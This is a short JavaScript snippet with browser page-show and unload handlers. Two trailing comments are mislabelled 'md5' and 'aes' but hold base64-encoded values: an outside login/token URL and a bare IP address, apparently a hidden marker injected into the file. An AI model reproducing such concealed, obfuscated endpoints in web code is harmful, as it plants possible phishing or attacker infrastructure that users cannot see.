if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL3d3dy5uZXdwaDE2LmNvbS9pbmRleC9sb2dpbi9sb2dpbi90b2tlbi9lNTExYzNlOGMyY2Y3NDEwYzA2ODcwNjExNzUxMTUwOC5odG1s**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/